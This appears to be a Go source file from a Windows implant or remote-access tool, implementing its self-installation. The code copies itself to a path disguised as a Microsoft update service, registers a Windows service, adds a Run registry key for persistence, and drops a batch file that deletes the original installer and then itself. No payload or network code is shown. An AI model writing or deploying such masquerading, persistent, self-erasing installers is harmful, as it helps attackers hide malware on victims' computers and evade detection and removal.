//go:build windows

package lifecycle

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/kataras/golog"
)

// WindowsInstaller handles self-installation on Windows
type WindowsInstaller struct{}

// NewInstaller creates a new Windows installer
func NewInstaller() *WindowsInstaller {
	return &WindowsInstaller{}
}

// GetInstallPath returns the target installation path
func (w *WindowsInstaller) GetInstallPath() string {
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	return filepath.Join(programData, "Microsoft", "Update", "UpdateService.exe")
}

// IsInstalled checks if the service is already installed
func (w *WindowsInstaller) IsInstalled() bool {
	installPath := w.GetInstallPath()
	golog.Infof("installer: checking if installed at %s", installPath)

	if _, err := os.Stat(installPath); err != nil {
		golog.Info("installer: binary not found, not installed")
		return false
	}
	golog.Info("installer: binary exists, checking service status")

	ctrl := NewServiceController(installPath)
	status, err := ctrl.Status()
	if err != nil {
		golog.Warnf("installer: service status check failed: %v", err)
		golog.Warn("installer: cleaning up stale binary")
		_ = os.Remove(installPath)
		return false
	}

	golog.Infof("installer: service status: %s", status)
	if status == "unknown" {
		golog.Warn("installer: service status unknown, cleaning up stale binary")
		_ = os.Remove(installPath)
		return false
	}

	golog.Info("installer: service is installed and registered")
	return true
}

// Install performs the self-installation
func (w *WindowsInstaller) Install() error {
	golog.Info("installer: starting Windows install sequence")
	// 1. Get current executable path
	selfPath, err := os.Executable()
	if err != nil {
		return err
	}

	// 2. Create install directory
	installPath := w.GetInstallPath()
	installDir := filepath.Dir(installPath)
	if err := os.MkdirAll(installDir, 0755); err != nil {
		return err
	}
	// Ensure any previous disable flag is cleared for fresh install
	_ = os.Remove(persistenceFlagPath(installPath))

	// 3. Copy executable to install location
	selfBytes, err := os.ReadFile(selfPath)
	if err != nil {
		return err
	}
	if err := os.WriteFile(installPath, selfBytes, 0755); err != nil {
		return err
	}

	// 4. Create service controller for installed path
	svcCtrl := NewServiceController(installPath)

	// 5. Install service
	golog.Info("installer: registering Windows service")
	if err := svcCtrl.Install(); err != nil {
		// Check if service already exists by examining error message
		if strings.Contains(err.Error(), "already exists") || strings.Contains(err.Error(), "already installed") {
			golog.Warn("installer: service already exists, continuing")
		} else {
			return err
		}
	} else {
		golog.Info("installer: service registration successful")
	}

	// 6. Configure persistence
	golog.Infof("installer: configuring Run key for %s", installPath)
	setRunKey(installPath + " --console")

	// 7. Start service
	golog.Info("installer: starting Windows service")
	if err := svcCtrl.Start(); err != nil {
		return err
	}

	// 8. Schedule deletion of the installer binary if different from install target
	if selfPath != installPath {
		scheduleSelfDelete(selfPath)
	}
	return nil
}

func setRunKey(path string) {
	setRunKeyRoots(path)
}

func scheduleSelfDelete(path string) {
	if path == "" {
		return
	}
	for i := 0; i < 3; i++ {
		batch := filepath.Join(os.TempDir(), "svc_cleanup.bat")
		contents := "@echo off\r\n" +
			"ping 127.0.0.1 -n 3 >nul\r\n" +
			"del /f /q \"" + path + "\"\r\n" +
			"del /f /q \"%~f0\"\r\n"
		if err := os.WriteFile(batch, []byte(contents), 0600); err != nil {
			continue
		}
		if exec.Command("cmd.exe", "/C", batch).Start() == nil {
			break
		}
	}
}

// Remove deletes the installed binary and clears the Run key entry (best-effort).
func (w *WindowsInstaller) Remove() error {
	installPath := w.GetInstallPath()
	if installPath != "" {
		_ = os.Remove(installPath)
	}

	clearRunKeyRoots()
	removeScheduledTask()
	return nil
}
